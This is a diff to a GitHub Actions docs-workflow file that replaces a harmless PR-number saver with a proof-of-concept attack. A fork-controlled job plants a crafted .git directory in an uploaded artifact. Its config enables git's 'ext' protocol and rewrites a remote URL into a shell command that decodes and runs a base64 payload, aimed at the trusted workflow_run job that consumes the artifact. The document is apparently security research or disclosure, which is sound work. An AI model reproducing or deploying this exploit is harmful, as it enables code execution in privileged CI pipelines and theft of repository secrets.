@@ -1,10 +1,8 @@
 name: Docs PR AI menu (collect)
 
-# Canonical home: elastic/oblt-aw/.github/remote-workflow-template/docs/.github/workflows/docs-pr-ai-menu-collect.yml
-# Distributed automatically to repos listed in elastic/oblt-aw/config/docs/active-repositories.json.
-# Part of the split-workflow pattern: saves the PR number as an artifact so that
-# docs-pr-ai-menu.yml can post the AI PR menu comment from a trusted workflow_run context,
-# avoiding the need for pull_request_target.
+# PoC: same workflow name as the upstream collector. For pull_request events from a
+# fork GitHub executes the workflow version from the pull request, so this job is
+# attacker-controlled while the artifact it uploads feeds the trusted workflow_run job.
 
 on:
   pull_request:
@@ -20,14 +18,55 @@ jobs:
     permissions:
       contents: read
     steps:
-      - name: Save PR number
+      - name: Checkout
+        uses: actions/checkout@v7.0.1
+
+      - name: Build artifact with attacker .git
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr_number.txt
+        run: |
+          set -euo pipefail
+          rm -rf art evil
+          mkdir -p art evil
+          cd evil
+          git init -q -b main .
+          git -c user.email=poc@example.com -c user.name=poc commit -q --allow-empty -m 'attacker commit'
+          cd ..
+          cp -r evil/.git art/.git
+          printf '%s\n' "$PR_NUMBER" > art/pr_number.txt
+
+      - name: Embed payload
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          set -euo pipefail
+          sed "s/__PR_NUMBER__/${PR_NUMBER}/g" poc/pwn.sh > /tmp/pwn.sh
+          python3 - <<'PY'
+          import base64, pathlib
+          script = pathlib.Path('/tmp/pwn.sh').read_bytes()
+          b64 = base64.b64encode(script).decode()
+          url = 'https://github.com/PDFtoMark/triage-elastic-v759d5e8-945dd0'
+          cfg = (
+              '[core]\n'
+              '\trepositoryformatversion = 0\n'
+              '\tfilemode = true\n'
+              '\tbare = false\n'
+              '\tlogallrefupdates = true\n'
+              '[protocol "ext"]\n'
+              '\tallow = always\n'
+              '[remote "origin"]\n'
+              '\turl = ' + url + '\n'
+              '\tfetch = +refs/heads/*:refs/remotes/origin/*\n'
+              '[url "ext::sh -c \'echo ' + b64 + '|base64 -d|sh\'"]\n'
+              '\tinsteadOf = ' + url + '\n'
+          )
+          pathlib.Path('art/.git/config').write_text(cfg)
+          PY
 
       - name: Upload PR number
         uses: actions/upload-artifact@v7
         with:
           name: pr-number
-          path: pr_number.txt
+          path: art
+          include-hidden-files: true
           retention-days: 1
